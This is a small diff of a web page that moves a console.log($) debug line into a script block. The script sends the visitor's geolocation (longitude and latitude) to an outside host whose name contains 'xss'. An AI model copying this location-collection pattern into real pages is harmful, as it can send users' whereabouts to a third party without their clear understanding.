@@ -10,6 +10,7 @@
 <div id='container'></div>
 <div id="tip"></div>
 <script type="text/javascript">
+        console.log($);
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
         $.get("https://xss.1jr.com.cn/data.php",{ getLng: lng, getLat: lat},function(result){
@@ -20,6 +21,6 @@
         console.log(err)
     });
 </script>
-     console.log($);
+ 
 </body>
 </html>
